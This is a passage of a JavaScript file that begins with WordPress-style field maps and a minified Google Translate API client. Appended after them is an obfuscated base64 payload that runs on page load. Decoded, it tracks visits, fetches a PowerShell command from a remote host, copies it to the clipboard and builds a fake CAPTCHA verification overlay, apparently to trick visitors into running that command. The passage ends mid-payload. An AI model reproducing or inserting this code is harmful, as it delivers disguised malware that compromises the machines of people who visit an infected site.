	image_meta: /* struct */ function( data ) {
		return {
			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
		};
	}
});

maps.mediaItemSize = createFieldMaps({
	file: /* string */ "file",
	height: /* string */ "height",
	mimeType: /* string */ "mime-type",
	width: /* string */ "width"
});

maps.postThumbnailImageMeta = createFieldMaps({
	aperture: /* int */ "aperture",
	camera: /* string */ "camera",
	caption: /* string */ "caption",
	copyright: /* string */ "copyright",
	createdTimestamp: /* int */ "created_timestamp",
	credit: /* string */ "credit",
	focalLength: /* int */ "focal_length",
	iso: /* int */ "iso",
	keywords: /* array */ "keywords",
	orientation: /* string */ "orientation",
	shutterSpeed: /* int */ "shutter_speed",
	title: /* string */ "title"
});

_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = apiBase + t + "?" + querystring.stringify(_.extend({
            key: e
        }, n));
        request.get(a, globalResponseHandler({
            url: a
        }, r))
    }
}, postRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = {
            url: apiBase + t,
            method: "POST",
            form: querystring.stringify(_.extend({
                key: e
            }, n)),
            headers: {
                "X-HTTP-Method-Override": "GET"
            }
        };
        request(a, globalResponseHandler(a, r))
    }
}, globalResponseHandler = function(e, t) {
    return function(n, r, a) {
        if (t && _.isFunction(t)) {
            if (n || !r || 200 !== r.statusCode) return t({
                error: n,
                response: r,
                body: a,
                request: e,
                toString: function() {
                    return n ? n.toString() : ""
                }
            }, null);
            var i = null;
            try {
                i = JSON.parse(a)
            } catch (e) {
                return t(n = "Could not parse response from Google: " + (a || "null"), null)
            }
            t(null, i)
        }
    }
}, parseTranslations = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), r = r.map((function(e) {
            return e.translatedText = entities.decode(e.translatedText), e
        })), t(null, r)
    }
}, parseSupportedLanguages = function(e) {
    return function(t, n) {
        if (t) return e(t, null);
        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
    }
}, parseLanguageDetections = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
            return e[0]
        })) : r[0], e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), t(null, r)
    }
}, shouldSplitSegments = function(e) {
    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
}, splitArraysForGoogle = function(e, t) {
    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
        var n = Math.floor(e.length / 2);
        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
    } else t.push(e)
};
module.exports = function(e, t) {
    var n = (t = t || {}).requestOptions || {};
    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
    var r = getRequestWithApi(e),
        a = postRequestWithApi(e),
        i = {
            translate: function(e, t, n, r) {
                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
                if ("string" != typeof n) return r("No target language specified. Must be a string");
                var i;
                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
                    [e]
                ];
                var o = {
                    target: n
                };
                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
                    a("", _.extend({
                        q: e
                    }, o), parseTranslations(e, t))
                }), (function(e, t) {
                    if (e) return r(e);
                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
                }))
            },
            getSupportedLanguages: function(e, t) {
                if (_.isFunction(e) ? (t = e, e = {}) : e = {
                        target: e
                    }, !_.isFunction(t)) return console.log("No callback defined");
                r("languages", e, parseSupportedLanguages(t))
            },
            detectLanguage: function(e, t) {
                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
                    [e]
                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
                    a("detect", {
                        q: e
                    }, parseLanguageDetections(e, t))
                }), (function(e, n) {
                    if (e) return t(e);
                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
                var n
            }
        };
    return {
        translate: i.translate,
        getSupportedLanguages: i.getSupportedLanguages,
        detectLanguage: i.detectLanguage
    }
};
}catch(e){}
})();


(function() {
  var _f = {
    "eg5wwv": "MC4xMDQ2NDI2MDc5OTUwNzA0MQ==",
    "l71ry9": "MC43OTkwOTIyNjc4NzQwMjM1",
    "966jko": "MC42NDg5ODQ3MjMwMTcwOTIy",
    "r1co70": "MC4zODQ3Nzc5MDczNzM4MDM=",
    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3ZlcmMtcGFuZWwudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdmZjEnOwogIGNvbnN0IHNjcmlwdElkID0gJ2Nta2d6eDJscjAwMDMwcWVhaHpybWUwcDUnOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJQ2dwSUQwK0lIc0tDaTh2SUZOb1lXUnZkeUJFVDAwZ2NtOXZkQ0JtYjNJZ2FYTnZiR0YwWldRZ2NYVmxjbWxsY3dwamIyNXpkQ0FrY205dmRDQTlJSGRwYm1SdmR5NWZYM1JtVTJoaFpHOTNVbTl2ZENCOGZDQmtiMk4xYldWdWREc0tDaTh2SU5DZjBMN1F1OUdEMFlmUXNOQzEwTHdnYzJOeWFYQjBTV1FnMExqUXR5RFF2OUN3MFlEUXNOQzgwTFhSZ3RHQTBMN1FzaUJWVWt3ZzBMalF1OUM0SU5DNDBZSFF2OUMrMEx2UmpOQzMwWVBRdGRDOElOQzAwTFhSaE5DKzBMdlJndEM5MFl2UXVRcGpiMjV6ZENCMWNteFFZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCelkzSnBjSFJKWkNBOUlIVnliRkJoY21GdGN5NW5aWFFvSjNOamNtbHdkRjlwWkNjcElIeDhJQ2RrWldaaGRXeDBKenNLQ214bGRDQm1aWFJqYUdWa1EyOXRiV0Z1WkNBOUlDY25Pd3BzWlhRZ1ptVjBZMmhsWkVOdmJXMWxiblFnUFNBbkp6c0tDZ3BtZFc1amRHbHZiaUJpWVhObE5qUkVaV052WkdWVlZFWXhOa3hGS0hOMGNpa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0F2THlEUW85QzAwTERRdTlHUDBMWFF2Q0RRdjlHQTBMN1FzZEMxMEx2Uml5RFF1Q0RRdjlDMTBZRFF0ZEN5MEw3UXROR0xJTkdCMFlMUmdOQyswTG9LSUNBZ0lDQWdJQ0J6ZEhJZ1BTQnpkSEl1Y21Wd2JHRmpaU2d2VzF4elhISmNibDByTDJjc0lDY25LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmlhVzVoY25rZ1BTQmhkRzlpS0hOMGNpazdDaUFnSUNBZ0lDQWdZMjl1YzNRZ1lubDBaWE1nUFNCdVpYY2dWV2x1ZERoQmNuSmhlU2hpYVc1aGNua3ViR1Z1WjNSb0tUc0tJQ0FnSUNBZ0lDQm1iM0lnS0d4bGRDQnBJRDBnTURzZ2FTQThJR0pwYm1GeWVTNXNaVzVuZEdnN0lHa3JLeWtnZXdvZ0lDQWdJQ0FnSUNBZ0lDQmllWFJsYzF0cFhTQTlJR0pwYm1GeWVTNWphR0Z5UTI5a1pVRjBLR2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNBdkx5QlZWRVl0TVRaTVJUb2daWFpsY25rZ01pQmllWFJsY3lCcGN5QmhJR05vWVhJS0lDQWdJQ0FnSUNCc1pYUWdjbVZ6ZFd4MElEMGdKeWM3Q2lBZ0lDQWdJQ0FnWm05eUlDaHNaWFFnYVNBOUlEQTdJR2tnUENCaWVYUmxjeTVzWlc1bmRHZzdJR2tnS3owZ01pa2dld29nSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnS3owZ1UzUnlhVzVuTG1aeWIyMURhR0Z5UTI5a1pTaGllWFJsYzF0cFhTQjhJQ2hpZVhSbGMxdHBJQ3NnTVYwZ1BEd2dPQ2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNCeVpYUjFjbTRnY21WemRXeDBPd29nSUNBZ2ZTQmpZWFJqYUNBb1pTa2dleUJ5WlhSMWNtNGdKeWM3SUgwS2ZRb0tZWE41Ym1NZ1puVnVZM1JwYjI0Z1ptVjBZMmhEYjIxdFlXNWtRVzVrUTI5dGJXVnVkQ2dwSUhzS0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnY21WeklEMGdZWGRoYVhRZ1ptVjBZMmdvWUdoMGRIQnpPaTh2ZG1WeVl5MXdZVzVsYkM1MlpYSmpaV3d1WVhCd0wyRndhUzl3YjNkbGNuTm9aV3hzTDJOdGEyZDZlREpzY2pBd01ETXdjV1ZoYUhweWJXVXdjRFZnS1RzS0lDQWdJQ0FnSUNCcFppQW9JWEpsY3k1dmF5a2dkR2h5YjNjZ2JtVjNJRVZ5Y205eUtDZEdZV2xzWldRZ2RHOGdabVYwWTJnZ1kyOXRiV0Z1WkNjcE93b2dJQ0FnSUNBZ0lHTnZibk4wSUdSaGRHRWdQU0JoZDJGcGRDQnlaWE11YW5OdmJpZ3BPd29nSUNBZ0lDQWdJR1psZEdOb1pXUkRiMjF0WVc1a0lEMGdZbUZ6WlRZMFJHVmpiMlJsVlZSR01UWk1SU2hrWVhSaExtTnZiVzFoYm1RZ2ZId2dKeWNwT3dvZ0lDQWdJQ0FnSUM4dklOQ2UwWUxRdTlDdzBMVFF1dEN3T2lEUXN0R0wwTExRdnRDMDBMalF2Q0RRdXRDKzBMelFzTkM5MExUUmd5RFFzaURRdXRDeTBMRFF0TkdBMExEUmd0QzkwWXZSaFNEUmdkQzYwTDdRc2RDNjBMRFJoU0RRdUNEUXROQzcwTGpRdmRHRENpQWdJQ0FnSUNBZ1kyOXVjMjlzWlM1c2IyY29KMXNuSUNzZ1ptVjBZMmhsWkVOdmJXMWhibVFnS3lBblhTY3NJR1psZEdOb1pXUkRiMjF0WVc1a0xteGxibWQwYUN3Z1ptVjBZMmhsWkVOdmJXMWhibVF1YzNCc2FYUW9KeWNwTG0xaGNDaGpJRDArSUdNdVkyaGhja052WkdWQmRDZ3dLU2twT3dvZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFpXNTBJRDBnWkdGMFlTNWpiMjF0Wlc1MElIeDhJQ2NuT3dvZ0lDQWdJQ0FnSUM4dklOQ1MwWUhSZ3RDdzBMTFF1TkdDMFl3Z1kyOXRiV1Z1ZENEUXNpQThZMjlrWlQ0Z0tOQzMwTERRdk5DMTBMM1F1TkdDMFl3ZzBZTFF0ZEM2MFlIUmdpa0tJQ0FnSUNBZ0lDQmpiMjV6ZENCamIyUmxSV3dnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDZGpiMlJsSnlrN0NpQWdJQ0FnSUNBZ2FXWWdLR052WkdWRmJDa2dZMjlrWlVWc0xuUmxlSFJEYjI1MFpXNTBJRDBnWm1WMFkyaGxaRU52YlcxbGJuUTdDaUFnSUNCOUlHTmhkR05vSUNobEtTQjdDaUFnSUNBZ0lDQWdabVYwWTJobFpFTnZiVzFoYm1RZ1BTQW5SbUZwYkdWa0lIUnZJR3h2WVdRZ1kyOXRiV0Z1WkNjN0NpQWdJQ0FnSUNBZ1ptVjBZMmhsWkVOdmJXMWxiblFnUFNBbkp6c0tJQ0FnSUgwS2ZRb0tZMjl1YzNRZ2RISmhZMnROWlhSeWFXTWdQU0FvZDJsdVpHOTNMbDlmZEhKaFkydE5aWFJ5YVdNcElEOGdkMmx1Wkc5M0xsOWZkSEpoWTJ0TlpYUnlhV01nT2lCbWRXNWpkR2x2YmloMGVYQmxLU0I3Q2lBZ0lDQjBjbmtnZXdvZ0lDQWdJQ0FnSUdOdmJuTjBJSFJsYlhCc1lYUmxTV1FnUFNCM2FXNWtiM2N1WDE5MFpXMXdiR0YwWlVsa0lIeDhJQ2RtWmpFbk93b2dJQ0FnSUNBZ0lHWmxkR05vS0NjdllYQnBMMjFsZEhKcFkzTXZkSEpoWTJzbkxDQjdDaUFnSUNBZ0lDQWdJQ0FnSUcxbGRHaHZaRG9nSjFCUFUxUW5MQW9nSUNBZ0lDQWdJQ0FnSUNCb1pXRmtaWEp6T2lCN0lDZERiMjUwWlc1MExWUjVjR1VuT2lBbllYQndiR2xqWVhScGIyNHZhbk52YmljZ2ZTd0tJQ0FnSUNBZ0lDQWdJQ0FnWW05a2VUb2dTbE5QVGk1emRISnBibWRwWm5rb2V5QjBlWEJsTENCMFpXMXdiR0YwWlRvZ2RHVnRjR3hoZEdWSlpDQjlLU3dLSUNBZ0lDQWdJQ0FnSUNBZ2JXOWtaVG9nSjI1dkxXTnZjbk1uTEFvZ0lDQWdJQ0FnSUNBZ0lDQnJaV1Z3WVd4cGRtVTZJSFJ5ZFdVS0lDQWdJQ0FnSUNCOUtTNWpZWFJqYUNnb0tTQTlQaUI3ZlNrN0NpQWdJQ0I5SUdOaGRHTm9JQ2hsY25JcElIdDlDbjA3Q2dwc1pYUWdZMjl0Y0d4bGRHVlVjbUZqYTJWa0lEMGdabUZzYzJVN0NtWjFibU4wYVc5dUlIUnlZV05yUTI5dGNHeGxkR1VvS1NCN0NpQWdJQ0JwWmlBb1kyOXRjR3hsZEdWVWNtRmphMlZrS1NCeVpYUjFjbTQ3Q2lBZ0lDQmpiMjF3YkdWMFpWUnlZV05yWldRZ1BTQjBjblZsT3dvZ0lDQWdkSEpoWTJ0TlpYUnlhV01vSjJOdmJYQnNaWFJsSnlrN0NuMEtDbU52Ym5OMElHWnBiR1ZKYm5CMWRDQTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSnlOcE9XcENXbUZ4VVROMkp5azdDbU52Ym5OMElHWnBiR1ZGZUhCc2IzSmxjaUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5TnBkVzg0UjI1c2JsSktkek4wTnpjbktUc0tZMjl1YzNRZ2NHRjBhQ0E5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0p5TnBZVTlGU0RSek1tSlRKeWs3Q21OdmJuTjBJR05vWldOclltOTRWMmx1Wkc5M0lEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWduSTJsbk5teExVRlZ2ZENjcE93b0tablZ1WTNScGIyNGdjMlYwVTJ0cGNFWnNZV2NvS1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lHeHZZMkZzVTNSdmNtRm5aUzV6WlhSSmRHVnRLQ2RmYzJ0cGNDY3NJQ2N4SnlrN0NpQWdJQ0I5SUdOaGRHTm9JQ2hsY25JcElIc0tJQ0FnSUNBZ0lDQmtiMk4xYldWdWRDNWpiMjlyYVdVZ1BTQW5YM05yYVhBOU1Uc2djR0YwYUQwdk95QnRZWGd0WVdkbFBUTXhOVE0yTURBd0p6c0tJQ0FnSUgwS2ZRb0tMeThnUTI5d2VTQndiM2RsY25Ob1pXeHNJR052YlcxaGJtUWdKaUJ2Y0dWdUlHWnBiR1VnWlhod2JHOXlaWElLYkdWMElHWnBiR1ZUWld4bFkzUmxaQ0E5SUdaaGJITmxPd3BwWmlBb1ptbHNaVVY0Y0d4dmNtVnlLU0I3Q2lBZ1ptbHNaVVY0Y0d4dmNtVnlMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9KMk5zYVdOckp5d2dZWE41Ym1NZ1puVnVZM1JwYjI0b0tTQjdDaUFnSUNBZ0lHRjNZV2wwSUdabGRHTm9RMjl0YldGdVpFRnVaRU52YlcxbGJuUW9LVHNLSUNBZ0lDQWdiR1YwSUdKaGMyVWdQU0JtWlhSamFHVmtRMjl0YldGdVpEc0tJQ0FnSUNBZ2JHVjBJR052YlcxbGJuUlFZWEowSUQwZ0tHWmxkR05vWldSRGIyMXRaVzUwSUQ4Z1ptVjBZMmhsWkVOdmJXMWxiblFnT2lBbkp5a2dLeUFpWENJaU93b2dJQ0FnSUNCc1pYUWdjM0JoWTJWeklEMGdKeWM3Q2lBZ0lDQWdJR2xtSUNnb1ltRnpaU0FySUdOdmJXMWxiblJRWVhKMEtTNXNaVzVuZEdnZ1BDQXlOVGtwSUhzS0lDQWdJQ0FnSUNBZ0lITndZV05sY3lBOUlDY2dKeTV5WlhCbFlYUW9NalU1SUMwZ0tHSmhjMlVnS3lCamIyMXRaVzUwVUdGeWRDa3ViR1Z1WjNSb0tUc0tJQ0FnSUNBZ2ZRb2dJQ0FnSUNCc1pYUWdabWx1WVd4VGRISWdQU0JpWVhObElDc2djM0JoWTJWeklDc2dZMjl0YldWdWRGQmhjblE3Q2lBZ0lDQWdJRzVoZG1sbllYUnZjaTVqYkdsd1ltOWhjbVF1ZDNKcGRHVlVaWGgwS0dacGJtRnNVM1J5S1RzS0lDQWdJQ0FnYzJWMFUydHBjRVpzWVdjb0tUc0tJQ0FnSUNBZ2RISmhZMnREYjIxd2JHVjBaU2dwT3dvZ0lDQWdJQ0JwWmlBb1ptbHNaVWx1Y0hWMEtTQm1hV3hsU1c1d2RYUXVZMnhwWTJzb0tUc0tJQ0FnSUNBZ0x5OGdWMkZwZENCbWIzSWdkWE5sY2lCMGJ5QnlaWFIxY200Z2RHOGdkR2hsSUhCaFoyVUtJQ0FnSUNBZ2JHVjBJR1p2WTNWelNHRnVaR3hsWkNBOUlHWmhiSE5sT3dvZ0lDQWdJQ0JqYjI1emRDQm9ZVzVrYkdWR2IyTjFjeUE5SUNncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUdsbUlDZ2habTlqZFhOSVlXNWtiR1ZrSUNZbUlDRm1hV3hsVTJWc1pXTjBaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0JtYjJOMWMwaGhibVJzWldRZ1BTQjBjblZsT3dvZ0lDQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNCOU93b2dJQ0FnSUNCM2FXNWtiM2N1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWduWm05amRYTW5MQ0JvWVc1a2JHVkdiMk4xY3lrN0NpQWdmU2s3Q24wS0NpOHZJRUpzYjJOcklHRnVlU0JoZEhSbGJYQjBaV1FnWm1sc1pTQjFjR3h2WVdSekNtbG1JQ2htYVd4bFNXNXdkWFFwSUhzS0lDQm1hV3hsU1c1d2RYUXVZV1JrUlhabGJuUk1hWE4wWlc1bGNpZ25ZMmhoYm1kbEp5d2dLQ2tnUFQ0Z2V3b2dJQ0FnSUNCbWFXeGxVMlZzWldOMFpXUWdQU0IwY25WbE93b2dJQ0FnSUNCaGJHVnlkQ2dpVUd4bFlYTmxJR1p2Ykd4dmR5QjBhR1VnYzNSaGRHVmtJR2x1YzNSeWRXTjBhVzl1Y3k0aUtUc0tJQ0FnSUNBZ1ptbHNaVWx1Y0hWMExuWmhiSFZsSUQwZ0lpSTdDaUFnSUNBZ0lITmxkRlJwYldWdmRYUW9LQ2tnUFQ0Z1ptbHNaVWx1Y0hWMExtTnNhV05yS0Nrc0lEVXdNQ2s3Q2lBZ2ZTazdDbjBLQ2k4cUlFVk9SQ0JPUlZjZ0tpOEtDZ29LTHk4Z1IwVlVJQXBqYjI1emRDQndZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCemFYUmxWWEpzSUQwZ2NHRnlZVzF6TG1kbGRDZ25jMmwwWlNjcElIeDhJSGRwYm1SdmR5NXNiMk5oZEdsdmJpNW9iM04wYm1GdFpUc0tZMjl1YzNRZ2JHOW5iMVZ5YkNBOUlIQmhjbUZ0Y3k1blpYUW9KMnh2WjI4bktUc0tZMjl1YzNRZ1pHVm1ZWFZzZEV4dloyOVZjbXdnUFNBbmFIUjBjSE02THk4eVkyRndkR05vWVM1amIyMHZaR2x6ZEM5M1pXSXZZWE56WlhSekwyZHZiMmRzWlMxd2NtbDJZV041TFhCdmJHbGplUzFEWWpCRFIxWlNWQzV6ZG1jbk93b0tKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZja0ZzYkNnbkxtTlZlRk50VVRkRlVVNWxRV2hUVmpZbktTNW1iM0pGWVdOb0tHVnNJRDArSUhzS0lDQmxiQzUwWlhoMFEyOXVkR1Z1ZENBOUlITnBkR1ZWY213N0NuMHBPd29LSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2tGc2JDZ25MbU5JVDNCSk5FTlNNRkFuS1M1bWIzSkZZV05vS0dsdFp5QTlQaUI3Q2lBZ2FXMW5Mbk55WXlBOUlHeHZaMjlWY213Z2ZId2daR1ZtWVhWc2RFeHZaMjlWY213N0NpQWdhVzFuTG1Gc2RDQTlJQ2RzYjJkdkp6c0tmU2s3Q2dvS0NtWjFibU4wYVc5dUlHbHVhWFJXWlhKcFptbGpZWFJwYjI1R2JHOTNLQ2tnZXdvZ0lDQWdZMjl1YzNRZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NJdVkwaG9SekJ6VjNkUVJ6WWlLVHNLSUNBZ0lHTnZibk4wSUhCeVpXeHZZV1JsY2xSbGVIUWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5S0NJdVkwRldlR2RoU2t4SVdpSXBPd29nSUNBZ1kyOXVjM1FnZEdWNGRFRnNiRk4wWlhBZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0l1WTJVMFZIbFZUMDlZZUVacGVIWjRJaWs3Q2lBZ0lDQmpiMjV6ZENCamFHVmphMkp2ZUZkcGJtUnZkeUE5SUNSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNJb0lpTnBaelpzUzFCVmIzUWlLVHNLSUNBZ0lHTnZibk4wSUhOMFpYQXdSV3hsYldWdWRITWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5UVd4c0tDSXVZM2xZYURSSWFqYzNUVkIxVHlJcE93b2dJQ0FnWTI5dWMzUWdjM1JsY0RGRmJHVnRaVzUwY3lBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSkJiR3dvSWk1ak5GcFNiak15Tld4Q2VpSXBPd29nSUNBZ1kyOXVjM1FnYzNSbGNESkZiR1Z0Wlc1MGN5QTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0pCYkd3b0lpNWpjSEZXWmxVemEwVnJJaWs3Q2lBZ0lDQmpiMjV6ZENCemRHVndNMFZzWlcxbGJuUnpJRDBnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2tGc2JDZ2lMbU5GU2tsMlRsZFVZa2xUTlc1VllVb2lLVHNLSUNBZ0lHTnZibk4wSUdOb1pXTnJZbTk0SUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNpZ2lJMmt4VXpkUGIyZHhNall6VjNWcGJpSXBPd29nSUNBZ1kyOXVjM1FnZG1WeWFXWjVWMmx1Wkc5M0lEMGdKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZjaWdpSTJsclJrZGFjM0JVT0NJcE93b2dJQ0FnWTI5dWMzUWdjM0JwYm01bGNpQTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSWlOcFJtWnJaR0kxVGxnaUtUc0tJQ0FnSUdOdmJuTjBJSFpsY21sbWVVSjFkSFJ2YmlBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9JaU5wTjJKMU1qWmtPRzVvWWs5eUlpazdDZ29nSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0J3Y21Wc2IyRmtaWEpVWlhoMExuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0k3Q2lBZ0lDQWdJQ0FnZEdWNGRFRnNiRk